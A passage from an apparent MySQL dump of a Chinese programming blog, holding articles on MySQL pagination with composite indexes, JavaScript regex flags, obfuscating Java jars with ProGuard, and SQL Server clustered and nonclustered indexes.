查询优化要抓住关键问题，对于数据库应用程序来说，重点在于如何提高SQL的执行效率。在数据库的开发和维护过程中，多表联接查询的优化设计可以提高系统性能，对于数据量大的数据库系统尤为重要。以上介绍的几种优化策略使多表联接查询在时间和空间上提高了系统的性能，在一定程度上提高了查询效率。</p>\r\n',0,1437807525,0,0),(67,24,'limit 百万级数据分页优化方法','<p>limit 百万级数据分页优化方法</p>\r\n\r\n<p>mysql教程 这个数据库教程绝对是适合dba级的高手去玩的，一般做一点1万 篇新闻的小型系统怎么写都可以，用xx框架可以实现快速开发。可是数据量到了10万，百万至千万，他的性能还能那么高吗？ 一点小小的失误，可能造成整个系统的改写，甚至更本系统无法正常运行！好了，不那么多废话了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>用事实说话，看例子：<br />\r\n数据表 collect ( id, title ,info ,vtype) 就这4个字段，其中 title 用定长，info 用text, id 是逐渐，vtype是tinyint，vtype是索引。这是一个基本的新闻系统的简单模型。现在往里面填充数据，填充10万篇新闻。</p>\r\n\r\n<p>最后collect 为 10万条记录，数据库表占用硬盘1.6g。ok ,看下面这条sql语句：<br />\r\nselect id,title from collect limit 1000,10; 很快；基本上0.01秒就ok，再看下面的</p>\r\n\r\n<p>select id,title from collect limit 90000,10; 从9万条开始分页，结果？</p>\r\n\r\n<p>8-9秒完成，my god 哪出问题了？？？？其实要优化这条数据，网上找得到答案。看下面一条语句:</p>\r\n\r\n<p>select id from collect order by id limit 90000,10; 很快，0.04秒就ok。 为什么？因为用了id主键做索引当然快。网上的改法是：<br />\r\nselect id,title from collect where id&gt;=(select id from collect order by id limit 90000,1) limit 10;</p>\r\n\r\n<p>这就是用了id做索引的结果。可是问题复杂那么一点点，就完了。看下面的语句<br />\r\nselect id from collect where vtype=1 order by id limit 90000,10; 很慢，用了8-9秒！</p>\r\n\r\n<p>到了这里我相信很多人会和我一样，有崩溃感觉！vtype 做了索引了啊？怎么会慢呢？vtype做了索引是不错，你直接<br />\r\nselect id from collect where vtype=1 limit 1000,10; 是很快的，基本上0.05秒，可是提高90倍，从9万开始，那就是0.05*90=4.5秒的速度了。和测试结果8-9秒到了一个数量级。从这里开始有人 提出了分表的思路，这个和discuz 论坛是一样的思路。思路如下：<br />\r\n建一个索引表： t (id,title,vtype) 并设置成定长，然后做分页，分页出结果再到 collect 里面去找info 。 是否可行呢？实验下就知道了。</p>\r\n\r\n<p>10万条记录到 t(id,title,vtype) 里，数据表大小20m左右。<br />\r\n用select id from t where vtype=1 order by id limit 90000,10; 很快了。基本上0.1-0.2秒可以跑完。</p>\r\n\r\n<p><br />\r\n为什么会这样呢？我猜想是因为collect 数据太多，所以分页要跑很长的路。limit 完全和数据表的大小有关的。其实这样做还是全表扫描，只是因为数据量小，只有10万才快。ok， 来个疯狂的实验，加到100万条，测试性能。</p>\r\n\r\n<p>加了10倍的数据，马上t表就到了200多m，而且是定长。还是刚才的查询语句，时间是0.1-0.2秒完成！分表性能没问题？错！因为我们的limit 还是9万，所以快。给个大的，90万开始<br />\r\nselect id from t where vtype=1 order by id limit 900000,10; 看看结果，时间是1-2秒！<br />\r\nwhy ?? 分表了时间还是这么长，非常之郁闷！有人说定长会提高limit的性能，开始我也以为，因为一条记录的长度是固定的，mysql 应该可以算出90万的位置才对啊？ 可是我们高估了mysql 的智能，他不是商务数据库，事实证明定长和非定长对limit影响不大？ 怪不得有人说 discuz到了100万条记录就会很慢，我相信这是真的，这个和数据库设计有关！</p>\r\n\r\n<p>难道 mysql 无法突破100万的限制吗？？？到了100万的分页就真的到了极限？？？</p>\r\n\r\n<p>答案是： no !!!! 为什么突破不了100万是因为不会设计mysql造成的。下面介绍非分表法，来个疯狂的测试！一张表搞定100万记录，并且10g 数据库，如何快速分页！<br />\r\n好了，我们的测试又回到 collect表，开始测试结论是： 30万数据，用分表法可行，超过30万他的速度会慢道你无法忍受！当然如果用分表+我这种方法，那是绝对完美的。但是用了我这种方法后，不用分表也可以完 美解决！</p>\r\n\r\n<p>答案就是：复合索引！ 有一次设计mysql索引的时候，无意中发现索引名字可以任取，可以选择几个字段进来，这有什么用呢？开始的select id from collect order by id limit 90000,10; 这么快就是因为走了索引，可是如果加了where 就不走索引了。抱着试试看的想法加了 search(vtype,id) 这样的索引。</p>\r\n\r\n<p><br />\r\n然后测试select id from collect where vtype=1 limit 90000,10; 非常快！0.04秒完成！<br />\r\n再测试: select id ,title from collect where vtype=1 limit 90000,10; 非常遗憾，8-9秒，没走search索引！<br />\r\n再测试：search(id,vtype)，还是select id 这个语句，也非常遗憾，0.5秒。</p>\r\n\r\n<p>综上：如果对于有where 条件，又想走索引用limit的，必须设计一个索引，将where 放第一位，limit用到的主键放第2位，而且只能select 主键！<br />\r\n完美解决了分页问题了。可以快速返回id就有希望优化limit ， 按这样的逻辑，百万级的limit 应该在0.0x秒就可以分完。看来mysql 语句的优化和索引时非常重要的！<br />\r\n好了，回到原题，如何将上面的研究成功快速应用于开发呢？如果用复合查询，我的轻量级框架就没的用 了。分页字符串还得自己写，那多麻烦？这里再看一个例子，思路就 出</p>\r\n\r\n<p><br />\r\n来了：<br />\r\nselect * from collect where id in (9000,12,50,7000); 竟然 0秒就可以查完！<br />\r\nmygod ，mysql 的索引竟然对于in语句同样有效！看来网上说in无法用索引是错误的！</p>\r\n\r\n<p>有了这个结论，就可以很简单的应用于轻量级框架了：<br />\r\n代码如下：</p>\r\n\r\n<p><br />\r\n代码<br />\r\n&nbsp;</p>\r\n\r\n<p>1&nbsp;&nbsp;&nbsp; $db=dblink(); 2&nbsp;&nbsp;&nbsp; $db-&gt;pagesize=20; 3&nbsp;&nbsp;&nbsp; $sql=&rdquo;select id from collect where vtype=$vtype&rdquo;; 4&nbsp;&nbsp;&nbsp; $db-&gt;execute($sql); 5&nbsp;&nbsp;&nbsp; $strpage=$db-&gt;strpage(); //将分页字符串保存在临时变量，方便输出 6&nbsp;&nbsp;&nbsp;&nbsp; while($rs=$db-&gt;fetch_array()){ 7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $strid.=$rs[id].&rsquo;,; 8&nbsp;&nbsp;&nbsp;&nbsp; } 9&nbsp;&nbsp;&nbsp; $strid=substr($strid,0,strlen($strid)-1); //构造出id字符串10&nbsp;&nbsp;&nbsp; $db-&gt;pagesize=0; //很关键，在不注销类的情况下，将分页清空，这样只需要用一次数据库连接，不需要再开；11&nbsp;&nbsp;&nbsp; $db-&gt;execute(&rdquo;select id,title,url,stime,gtime,vtype,tag from collect where id in ($strid)&rdquo;);12&nbsp;&nbsp;&nbsp; &lt;?php教程 while($rs=$db-&gt;fetch_array()): ?&gt;13&nbsp;&nbsp;&nbsp; &lt;tr&gt;14&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[id];?&gt;&lt;/td&gt;15&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[url];?&gt;&lt;/td&gt;16&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[stime];?&gt;&lt;/td&gt;17&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[gtime];?&gt;&lt;/td&gt;18&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[vtype];?&gt;&lt;/td&gt;19&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;a href=&rdquo;?act=show&amp;id=&lt;?php echo $rs[id];?&gt;&rdquo; target=&rdquo;_blank&rdquo;&gt;&lt;?php echo $rs[title];?&gt;&lt;/a&gt;&lt;/td&gt;20&nbsp;&nbsp; &lt;td&gt;&amp;nbsp;&lt;?php echo $rs[tag];?&gt;&lt;/td&gt;21&nbsp;&nbsp;&nbsp; &lt;/tr&gt;22&nbsp;&nbsp; &lt;?php endwhile; ?&gt;23&nbsp;&nbsp; 23. &lt;/table&gt;24&nbsp;&nbsp; 24. &lt;?php25&nbsp;&nbsp; 25. echo $strpage;26<br />\r\n通过简单的变换，其实思路很简单：1）通过优化索引，找出id，并拼成 &ldquo;123,90000,12000&prime; 这样的字符串。2）第2次查询找出结果。<br />\r\n小小的索引+一点点的改动就使mysql 可以支持百万甚至千万级的高效分页！</p>\r\n\r\n<p>通过这里的例子，我反思了一点：对于大型系统，php千万不能用框架，尤其是那种连 sql语句都看不到的框架！因为开始对于我的轻量级框架都差点崩溃！只适合小型应用的快速开发，对于erp,oa，大型网站，数据层包括逻辑层的东西都不 能用框架。如果程序员失去了对sql语句的把控，那项目的风险将会成几何级数增加！尤其是用mysql 的时候，mysql 一定需要专业的dba 才可以发挥他的最佳性能。一个索引所造成的性能差别可能是上千倍！</p>\r\n\r\n<p>ps教程: 经过实际测试，到了100万的数据，160万数据，15g表，190m索引，就算走索引，limit都得0.49秒。所以分页最好别让别人看到10万条以 后的数据，要不然会很慢！就算用索引。经过这样的优化，mysql到了百万级分页是个极限！但有这样的成绩已经很不错，如果你是用sqlserver肯定 卡死！而160万的数据用 id in (str) 很快，基本还是0秒。如果这样，千万级的数据，mysql应该也很容易应付</p>\r\n\r\n<p>本文转载自【web优化网】新闻中心:http://www.web-youhua.com/html/web-youhua-198602547.html</p>\r\n',0,1437807734,0,0),(68,1,'js/javascript正则表达式中/g /i /m的用法,以及实例（转）','<p>正则的思想都是一样的，但是具体的写法会有所不同，在这里提到的/g,/i,/m在其他的地方也许就不能用了。</p>\r\n\r\n<p>一，js正则标志/g,/i,/m说明</p>\r\n\r\n<p>1，/g&nbsp; 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</p>\r\n\r\n<p>2，/i&nbsp; 表示匹配的时候不区分大小写</p>\r\n\r\n<p>3，/m&nbsp; 表示多行匹配，什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</p>\r\n\r\n<p><br />\r\n二，实例说明</p>\r\n\r\n<p>1，/g的用法</p>\r\n\r\n<p><br />\r\n&lt;script type=&quot;text/javascript&quot;&gt; &nbsp;<br />\r\nstr = &quot;tankZHang&nbsp; (231144)&quot;+ &nbsp;<br />\r\n&quot;tank ying (155445)&quot;; &nbsp;<br />\r\nres =&nbsp; str.match(/tank/);&nbsp;&nbsp;&nbsp; //没有加/g &nbsp;<br />\r\nalert(res);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示一个tank&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\nres = str.match(/tank/g);&nbsp;&nbsp; //加了/g &nbsp;<br />\r\nalert(res);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示为tank,tank&nbsp;&nbsp; &nbsp;<br />\r\n&lt;STRONG&gt;&lt;/script&gt;&lt;/STRONG&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2，/i的用法</p>\r\n\r\n<p><br />\r\n&lt;script type=&quot;text/javascript&quot;&gt; &nbsp;<br />\r\nstr =&nbsp; &quot;tankZHang (231144)&quot;+&nbsp; &quot;tank ying (155445)&quot;;<br />\r\n&nbsp;<br />\r\nres =&nbsp; str.match(/zhang/);&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\nalert(res);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示为null&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\nres = str.match(/zhang/i);&nbsp;&nbsp; //加了/i&nbsp;&nbsp; &nbsp;<br />\r\nalert(res);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示为ZHang&nbsp;&nbsp; &nbsp;<br />\r\n&lt;/script&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>3，/m的用法</p>\r\n\r\n<p><br />\r\n&lt;script type=&quot;text/javascript&quot;&gt; &nbsp;<br />\r\nvar p = /$/mg;&nbsp;&nbsp; &nbsp;<br />\r\nvar s = &#39;1\\n2\\n3\\n4\\n5\\n6&#39;; &nbsp;<br />\r\nalert(p.test(s));&nbsp; //显示为true&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.rightContext.replace(/\\x0A/g, &#39;\\\\a&#39;));&nbsp; //显示\\a2\\a3\\a4\\a5\\a6&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.leftContext);&nbsp;&nbsp;&nbsp; //显示为竖的2345&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.rightContext);&nbsp;&nbsp; //显示为6 &nbsp;<br />\r\n&nbsp;<br />\r\nvar p = /$/g; &nbsp;<br />\r\nvar s =&nbsp; &#39;1\\n2\\n3\\n4\\n5\\n6&#39;; &nbsp;<br />\r\nalert(p.test(s));&nbsp; //显示为true&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.rightContext.replace(/\\x0A/g, &#39;\\\\a&#39;));&nbsp; //什么都不显示&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.leftContext);&nbsp;&nbsp;&nbsp; //显示为竖的123456&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.rightContext);&nbsp;&nbsp; //什么都不显示 &nbsp;<br />\r\n&nbsp;<br />\r\nvar p = /^/mg; &nbsp;<br />\r\nvar&nbsp; s = &#39;1\\n2\\n3\\n4\\n5\\n6&#39;; &nbsp;<br />\r\nalert(p.test(s));&nbsp;&nbsp;&nbsp; //显示为true&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.rightContext.replace(/\\x0A/g, &#39;\\\\a&#39;)); //显示为1\\a2\\a3\\a4\\a5\\a6&nbsp;&nbsp; &nbsp;<br />\r\nalert(RegExp.leftContext);&nbsp;&nbsp;&nbsp;&nbsp; //显示为竖的</p>\r\n',0,1437807802,0,0),(69,34,'一步步教你使用Proguard混淆Java源代码','<p>java代码很容易被反编译，以下使用proguard来保护我们的代码</p>\r\n\r\n<p>proguard选项很多，容易迷糊，现在就把我的配置写下来(实际使用中)，以供参考</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1.到http://proguard.sourceforge.net/下载proguard</p>\r\n\r\n<p>2.准备好你的jar包，我在这里举例叫做test.jar。</p>\r\n\r\n<p>3.解压proguard，执行 bin目录下的proguardgui.bat。</p>\r\n\r\n<p>如图1</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150643633084.png\" style=\"height:339px; width:1001px\" /></p>\r\n\r\n<p>4.运行如图，点击左边&ldquo;input/output&rdquo; 菜单，如图2</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150710109777.png\" style=\"height:493px; width:926px\" /></p>\r\n\r\n<p>5.点击右边的&ldquo;add input&rdquo; 加入我们要混的jar包，test.jar</p>\r\n\r\n<p>点击右边的&ldquo;add output&rdquo; 填入我们要输出的jar包(命名随便)，这里我写 test_out.jar。</p>\r\n\r\n<p>&nbsp;&nbsp; 注意输出的jar包，要自己手工填写。</p>\r\n\r\n<p>&nbsp; &nbsp;</p>\r\n\r\n<p>6.添加支持库，下边的 &ldquo;Library jars,wars,ears .....&rdquo; 那个框框。</p>\r\n\r\n<p>&nbsp;&nbsp; 点击右边的&ldquo;add&rdquo;。</p>\r\n\r\n<p>说明一下，这里最好把你的myeclipse里java project里的libraries所有Library的jar包，copy到一个目录，然后在这里加入这些jar包，myeclipse的环境支持jar包一般，如图3</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150733761596.png\" style=\"height:517px; width:771px\" /></p>\r\n\r\n<p>7.做完以上步骤后，应该如下图4，这样就差不多了</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150757907687.png\" style=\"height:488px; width:923px\" /></p>\r\n\r\n<p>8.点击&ldquo;shrinking&rdquo; ，设置成如图5。(可根据需要设置，这里只是我的配置)</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150822172619.png\" style=\"height:551px; width:923px\" /></p>\r\n\r\n<p>9.点击&ldquo;obfuscation&rdquo; ，设置如图6。(可根据需要设置，这里只是我的配置)</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150901995111.png\" style=\"height:706px; width:923px\" /></p>\r\n\r\n<p>10.点击&ldquo;optimization&rdquo; 设置如图7。(可根据需要设置，这里只是我的配置)</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150925945562.png\" style=\"height:698px; width:923px\" /></p>\r\n\r\n<p>11.点击&ldquo;process&rdquo;，再点击&ldquo;save configuration&rdquo;，在弹出的对话框中，输入要保存的配置文件名称(这里我的是test.pro)，最后点击&ldquo;保存&rdquo;。如图8</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725150949380728.png\" style=\"height:698px; width:923px\" /></p>\r\n\r\n<p>至些图形化的设置部分已经完成。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>12.最后，添加要保留的类与方法。</p>\r\n\r\n<p>&nbsp;用编辑器编辑刚才保存下来的&ldquo;test.pro&rdquo;，用记事本什么都可以，打开后大致应该是以下的样子</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>-injars test.jar<br />\r\n-outjars test_out.jar</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>-libraryjars &#39;C:\\Program Files (x86)\\Java\\jdk1.6.0_10\\jre\\lib\\rt.jar&#39;<br />\r\n-libraryjars lib\\ant.jar<br />\r\n-libraryjars lib\\aopalliance-1.0.jar<br />\r\n-libraryjars lib\\commons-dbcp-1.4.jar<br />\r\n-libraryjars lib\\commons-fileupload-1.2.1.jar<br />\r\n-libraryjars lib\\commons-io-1.4.jar</p>\r\n\r\n<p>.....设置的支持库包，略</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>-dontskipnonpubliclibraryclassmembers<br />\r\n-dontshrink<br />\r\n-useuniqueclassmembernames<br />\r\n-keeppackagenames<br />\r\n-keepattributes&nbsp;&nbsp; Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,LocalVariable*Table,*Annotation*,Synthetic,EnclosingMethod<br />\r\n-keepparameternames<br />\r\n-ignorewarnings</p>\r\n\r\n<p>....我们在这里加入要保持的类和方法，写法如下，红色部分是我们加的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>-keep class org.bl.soa.components.constant.* {<br />\r\n&nbsp;&nbsp;&nbsp; public &lt;fields&gt;;<br />\r\n&nbsp;&nbsp;&nbsp; public &lt;methods&gt;;<br />\r\n&nbsp;&nbsp;&nbsp; *** set*(***);<br />\r\n&nbsp;&nbsp;&nbsp; *** get*();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>-keep class org.bl.hibernate.* {<br />\r\n&nbsp;&nbsp;&nbsp; public &lt;fields&gt;;<br />\r\n&nbsp;&nbsp;&nbsp; public &lt;methods&gt;;<br />\r\n&nbsp;&nbsp;&nbsp; *** set*(***);<br />\r\n&nbsp;&nbsp;&nbsp; *** get*();<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>.....继续加其他的要保留的类和方法，有多少写多少。我是把test.jar里的所有类都加进来。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>....后面还一些自动生成的配置，不用管它们。</p>\r\n\r\n<p>....略</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>13.写完后，保存。</p>\r\n\r\n<p>重新打开progrard，执行 bin目录下的proguardgui.bat。</p>\r\n\r\n<p>&nbsp;&nbsp; 点击第一个选项&ldquo;Proguard&rdquo;，再点击&ldquo;Load configuration&rdquo;，选择我们刚才保存的&ldquo;test.pro&rdquo;进行加载。</p>\r\n\r\n<p>&nbsp;&nbsp; 如下图</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725151016344528.png\" style=\"height:704px; width:923px\" /></p>\r\n\r\n<p>14.开始混代码，点击右边&ldquo;process&rdquo;，再点击&ldquo;process!&rdquo;，如下图</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725151044608804.png\" style=\"height:702px; width:915px\" /></p>\r\n\r\n<p>15,在等待处理完成后，输出的&ldquo;test_out.jar&rdquo;，就是混过的jar包，你可以用xjad反编看下效果。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>16,如果在处理过程中有问题，一般会有提示，大部分一般都是缺少关联类，如果少了相关类，在第7步的图，把缺少的支持包加进来就可以了。</p>\r\n',0,1437808274,0,0),(70,24,'SQL优化-索引','<p>微软的SQL SERVER提供了两种索引：聚集索引(clustered index，也称聚类索引、簇集索引)和非聚集索引(nonclustered index，也称非聚类索引、</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>非簇集索引)&hellip;&hellip;</p>\r\n\r\n<p>(一)深入浅出理解索引结构</p>\r\n\r\n<p>实际上，您可以把索引理解为一种特殊的目录。微软的SQL SERVER提供了两种索引：聚集索引(clustered index，也称聚类索引、簇集索引)和</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>非聚集索引(nonclustered index，也称非聚类索引、非簇集索引)。下面，我们举例来说明一下聚集索引和非聚集索引的区别：</p>\r\n\r\n<p>其实，我们的汉语字典的正文本身就是一个聚集索引。比如，我们要查&ldquo;安&rdquo;字，就会很自然地翻开字典的前几页，因为&ldquo;安&rdquo;的拼音是&ldquo;an&rdquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，而按照拼音排序汉字的字典是以英文字母&ldquo;a&rdquo;开头并以&ldquo;z&rdquo;结尾的，那么&ldquo;安&rdquo;字就自然地排在字典的前部。如果您翻完了所有以&ldquo;a&rdquo;开头的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>部分仍然找不到这个字，那么就说明您的字典中没有这个字;同样的，如果查&ldquo;张&rdquo;字，那您也会将您的字典翻到最后部分，因为&ldquo;张&rdquo;的拼音</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>是&ldquo;zhang&rdquo;。也就是说，字典的正文部分本身就是一个目录，您不需要再去查其他目录来找到您需要找的内容。</p>\r\n\r\n<p>我们把这种正文内容本身就是一种按照一定规则排列的目录称为&ldquo;聚集索引&rdquo;。</p>\r\n\r\n<p>如果您认识某个字，您可以快速地从自典中查到这个字。但您也可能会遇到您不认识的字，不知道它的发音，这时候，您就不能按照刚才的方法</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>找到您要查的字，而需要去根据&ldquo;偏旁部首&rdquo;查到您要找的字，然后根据这个字后的页码直接翻到某页来找到您要找的字。但您结合&ldquo;部首目录&rdquo;和</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&ldquo;检字表&rdquo;而查到的字的排序并不是真正的正文的排序方法，比如您查&ldquo;张&rdquo;字，我们可以看到在查部首之后的检字表中&ldquo;张&rdquo;的页码是672页，检</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>字表中&ldquo;张&rdquo;的上面是&ldquo;驰&rdquo;字，但页码却是63页，&ldquo;张&rdquo;的下面是&ldquo;弩&rdquo;字，页面是390页。很显然，这些字并不是真正的分别位于&ldquo;张&rdquo;字的上</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下方，现在您看到的连续的&ldquo;驰、张、弩&rdquo;三字实际上就是他们在非聚集索引中的排序，是字典正文中的字在非聚集索引中的映射。我们可以通过这</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>种方式来找到您所需要的字，但它需要两个过程，先找到目录中的结果，然后再翻到您所需要的页码。</p>\r\n\r\n<p>我们把这种目录纯粹是目录，正文纯粹是正文的排序方式称为&ldquo;非聚集索引&rdquo;。</p>\r\n\r\n<p>通过以上例子，我们可以理解到什么是&ldquo;聚集索引&rdquo;和&ldquo;非聚集索引&rdquo;。</p>\r\n\r\n<p>进一步引申一下，我们可以很容易的理解：每个表只能有一个聚集索引，因为目录只能按照一种方法进行排序。</p>\r\n\r\n<p>(二)何时使用聚集索引或非聚集索引</p>\r\n\r\n<p>下面的表总结了何时使用聚集索引或非聚集索引(很重要)。</p>\r\n\r\n<p>&nbsp;动作描述使用聚集索引 使用非聚集索引</p>\r\n\r\n<p>&nbsp;外键列 应&nbsp; 应</p>\r\n\r\n<p>&nbsp;主键列 应 应</p>\r\n\r\n<p>&nbsp;列经常被分组排序(order by) 应 应</p>\r\n\r\n<p>&nbsp;返回某范围内的数据 应 不应</p>\r\n\r\n<p>&nbsp;小数目的不同值 应 不应</p>\r\n\r\n<p>&nbsp;大数目的不同值 不应 应</p>\r\n\r\n<p>&nbsp;频繁更新的列不应 应</p>\r\n\r\n<p>&nbsp;频繁修改索引列 不应 应</p>\r\n\r\n<p>&nbsp;一个或极少不同值 不应 不应</p>\r\n\r\n<p>&nbsp; 事实上，我们可以通过前面聚集索引和非聚集索引的定义的例子来理解上表。如：返回某范围内的数据一项。比如您的某个表有一个时间列，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>恰好您把聚合索引建立在了该列，这时您查询2004年1月1日至2004年10月1日之间的全部数据时，这个速度就将是很快的，因为您的这本字典正文是</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>按日期进行排序的，聚类索引只需要找到要检索的所有数据中的开头和结尾数据即可;而不像非聚集索引，必须先查到目录中查到每一项数据对应的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>页码，然后再根据页码查到具体内容。</p>\r\n\r\n<p>(三)结合实际，谈索引使用的误区</p>\r\n\r\n<p>理论的目的是应用。虽然我们刚才列出了何时应使用聚集索引或非聚集索引，但在实践中以上规则却很容易被忽视或不能根据实际情况进行综合</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>分析。下面我们将根据在实践中遇到的实际问题来谈一下索引使用的误区，以便于大家掌握索引建立的方法。</p>\r\n\r\n<p>1、主键就是聚集索引</p>\r\n\r\n<p>这种想法笔者认为是极端错误的，是对聚集索引的一种浪费。虽然SQL SERVER默认是在主键上建立聚集索引的。</p>\r\n\r\n<p>通常，我们会在每个表中都建立一个ID列，以区分每条数据，并且这个ID列是自动增大的，步长一般为1。我们的这个办公自动化的实例中的列</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Gid就是如此。此时，如果我们将这个列设为主键，SQL SERVER会将此列默认为聚集索引。这样做有好处，就是可以让您的数据在数据库中按照ID进</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>行物理排序，但笔者认为这样做意义不大。</p>\r\n\r\n<p>显而易见，聚集索引的优势是很明显的，而每个表中只能有一个聚集索引的规则，这使得聚集索引变得更加珍贵。</p>\r\n\r\n<p>从我们前面谈到的聚集索引的定义我们可以看出，使用聚集索引的最大好处就是能够根据查询要求，迅速缩小查询范围，避免全表扫描。在实际</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>应用中，因为ID号是自动生成的，我们并不知道每条记录的ID号，所以我们很难在实践中用ID号来进行查询。这就使让ID号这个主键作为聚集索引成</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>为一种资源浪费。其次，让每个ID号都不同的字段作为聚集索引也不符合&ldquo;大数目的不同值情况下不应建立聚合索引&rdquo;规则;当然，这种情况只是针</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>对用户经常修改记录内容，特别是索引项的时候会负作用，但对于查询速度并没有影响。</p>\r\n\r\n<p>在办公自动化系统中，无论是系统首页显示的需要用户签收的文件、会议还是用户进行文件查询等任何情况下进行数据查询都离不开字段的是&ldquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>日期&rdquo;还有用户本身的&ldquo;用户名&rdquo;。</p>\r\n\r\n<p>通常，办公自动化的首页会显示每个用户尚未签收的文件或会议。虽然我们的where语句可以仅仅限制当前用户尚未签收的情况，但如果您的系</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>统已建立了很长时间，并且数据量很大，那么，每次每个用户打开首页的时候都进行一次全表扫描，这样做意义是不大的，绝大多数的用户1个月前</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的文件都已经浏览过了，这样做只能徒增数据库的开销而已。事实上，我们完全可以让用户打开系统首页时，数据库仅仅查询这个用户近3个月来未</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>阅览的文件，通过&ldquo;日期&rdquo;这个字段来限制表扫描，提高查询速度。如果您的办公自动化系统已经建立的2年，那么您的首页显示速度理论上将是原</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>来速度8倍，甚至更快。</p>\r\n\r\n<p>在这里之所以提到&ldquo;理论上&rdquo;三字，是因为如果您的聚集索引还是盲目地建在ID这个主键上时，您的查询速度是没有这么高的，即使您在&ldquo;日期</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&rdquo;这个字段上建立的索引(非聚合索引)。下面我们就来看一下在1000万条数据量的情况下各种查询的速度表现(3个月内的数据为25万条)：</p>\r\n\r\n<p>(1)仅在主键上建立聚集索引，并且不划分时间段：</p>\r\n\r\n<p>Select gid,fariqi,neibuyonghu,title from tgongwen</p>\r\n\r\n<p>用时：128470毫秒(即：128秒)</p>\r\n\r\n<p>(2)在主键上建立聚集索引，在fariq上建立非聚集索引：</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt; 